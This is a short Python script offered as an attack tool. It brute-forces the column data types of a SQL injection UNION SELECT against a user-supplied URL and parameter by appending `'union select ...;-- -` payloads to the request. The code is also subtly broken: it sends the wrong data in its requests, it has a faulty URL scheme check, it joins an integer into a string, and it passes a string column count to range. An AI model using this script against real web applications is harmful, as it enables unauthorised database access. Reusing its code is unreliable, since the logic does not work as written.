#! /usr/bin/env python3

import requests
import argparse
import string
import random
import itertools


__DATA_TYPES__ = {
	'int': random.randint(0, 100),
	'str': ''.join([random.choice(string.ascii_letters) for _ in range(5)]),
	'date': '2022-10-10',
	# 'float': random.random()
}

def create_payload(max_len):
	'''
	Creates all permutations of datatypes
	'''
	payloads = []

	for p in itertools.product(__DATA_TYPES__.values(), repeat=(max_len)):
		payloads.append(','.join(p))

	return payloads


def brute(url, param_str, vuln_param, http_method, max_col):
	'''
	Brutes columns data types within union statement
	'''

	params = param_str.split('&')

	params = [k.split('=') for k in params]

	params_dict = {}

	for p in params:
		params_dict[p[0]] = p[1]
	
	print(f'Defined params: {params}')

	if vuln_param not in param_str:
		raise ValueError(f'Wrong vuln param name! {vuln_param}')

	if not url.startswith('http://') or not url.startswith('https://'):
		url = 'http://' + url

	for i in range(0, max_col):
		payloads = create_payload(i)
		for p in payloads:
			params_dict[vuln_param] = params_dict[vuln_param] + f'\'union select {p};-- -' 			
			if http_method.lower() == 'get':
				r = requests.get(url, data=payloads, allow_redirects=False)

			else:
				r = requests.post(url, data=payloads, allow_redirects=False)
			
			print(f'[*] Payload: {p}\nGot: {r.status_code}\nRes size: {len(r.text)}')

			for v in __DATA_TYPES__.values():
				if v in r.text:
					print(f'[!!!] POSSIBLE SQLI {p}')

	print(f'[*] Done & bye')
				


if __name__ == '__main__':
	ap = argparse.ArgumentParser('Sqli union select parameter bruter')
	ap.add_argument('-u', '--url', required=True,
		metavar='URL', help='Vulnerable url')
	ap.add_argument('-p', '--param', required=True, 
		metavar='param&string', help='quoted parameter string')
	ap.add_argument('-v', '--vuln', required=True,
		metavar='PARAM', help='vulnerable parameter from param')
	ap.add_argument('-X', '--method', required=True, choices=['get', 'post'],
		metavar='HTTP_METHOD', help='HTTP Method (default POST)', default='POST')
	ap.add_argument('-n', '--max_col', help='Maxium columns number to test', default=5, metavar='N')

	args = ap.parse_args()

	brute(args.url, args.param, args.vuln, args.method, args.max_col)
